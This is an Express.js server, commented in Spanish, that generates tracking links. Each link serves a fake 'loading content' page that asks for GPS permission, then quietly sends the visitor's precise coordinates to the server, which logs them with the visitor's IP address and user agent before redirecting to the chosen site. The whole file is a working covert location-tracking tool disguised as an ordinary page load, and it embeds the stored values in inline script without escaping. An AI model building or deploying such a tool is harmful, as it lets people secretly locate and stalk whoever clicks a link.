require('dotenv').config();
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json());

// Confianza en el proxy inverso de Render para cabeceras HTTP
app.set('trust proxy', true);

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error('Error crítico: Se requieren las variables SUPABASE_URL y SUPABASE_SERVICE_ROLE_KEY.');
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

/**
 * 1. Generar nuevo enlace de rastreo
 * Recibe: { "targetUrl": "https://sitio-destino.com" }
 */
app.post('/api/generate-link', async (req, res) => {
  const { targetUrl } = req.body;

  try {
    const destination = targetUrl && targetUrl.trim() !== '' ? targetUrl.trim() : 'https://google.com';

    const { data, error } = await supabase
      .from('tracking_links')
      .insert([{ target_url: destination }])
      .select('id')
      .single();

    if (error) throw error;

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const trackingLink = `${protocol}://${host}/r/${data.id}`;

    return res.status(201).json({
      success: true,
      tracking_id: data.id,
      link: trackingLink,
      target_url: destination
    });
  } catch (err) {
    console.error('Error en /api/generate-link:', err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 2. Servir página web intermedia para solicitar GPS del hardware
 */
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;

  // Evitar almacenamiento en caché para garantizar que cada clic ejecute el script
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');

  try {
    const { data: linkRecord, error } = await supabase
      .from('tracking_links')
      .select('target_url')
      .eq('id', id)
      .single();

    if (error || !linkRecord) {
      return res.redirect(302, 'https://google.com');
    }

    const destination = linkRecord.target_url;

    const html = `
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Cargando...</title>
        <style>
          body { 
            font-family: system-ui, -apple-system, sans-serif; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            background: #f8fafc; 
            color: #334155; 
          }
          .card { 
            text-align: center; 
            padding: 2.5rem; 
            background: #ffffff; 
            border-radius: 16px; 
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1); 
            max-width: 360px; 
            width: 90%; 
          }
          .spinner { 
            border: 3px solid #e2e8f0; 
            border-top: 3px solid #2563eb; 
            border-radius: 50%; 
            width: 36px; 
            height: 36px; 
            animation: spin 1s linear infinite; 
            margin: 1.5rem auto; 
          }
          @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
          }
        </style>
      </head>
      <body>
        <div class="card">
          <h3 style="margin-top:0;">Cargando contenido</h3>
          <p style="font-size: 0.95rem; color: #64748b;">Por favor, confirma el permiso de ubicación en pantalla para continuar...</p>
          <div class="spinner"></div>
        </div>

        <script>
          const trackingId = "${id}";
          const destination = "${destination}";

          async function sendPayload(payload) {
            try {
              await fetch('/api/submit-gps', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ link_id: trackingId, ...payload }),
                keepalive: true
              });
            } catch (err) {
              console.error(err);
            } finally {
              window.location.href = destination;
            }
          }

          if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                sendPayload({
                  status: 'granted',
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy
                });
              },
              (err) => {
                sendPayload({
                  status: 'denied'
                });
              },
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
          } else {
            window.location.href = destination;
          }
        </script>
      </body>
      </html>
    `;

    return res.send(html);

  } catch (err) {
    console.error('Error en /r/:id:', err.message);
    return res.redirect(302, 'https://google.com');
  }
});

/**
 * 3. Endpoint receptor de coordenadas exactas enviadas por el navegador
 */
app.post('/api/submit-gps', async (req, res) => {
  const { link_id, latitude, longitude, accuracy, status } = req.body;
  const userAgent = req.headers['user-agent'] || 'Desconocido';

  const forwarded = req.headers['x-forwarded-for'];
  let clientIp = req.headers['cf-connecting-ip'] || 
                 req.headers['x-real-ip'] || 
                 (forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress);

  if (clientIp && clientIp.includes('::ffff:')) {
    clientIp = clientIp.replace('::ffff:', '');
  }

  try {
    if (status === 'granted') {
      await supabase
        .from('tracking_logs')
        .insert([{
          link_id: link_id,
          ip_address: clientIp,
          latitude: latitude,
          longitude: longitude,
          user_agent: `${userAgent} [GPS ±${Math.round(accuracy || 0)}m]`
        }]);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error en /api/submit-gps:', err.message);
    return res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor activo en el puerto ${PORT}`);
});
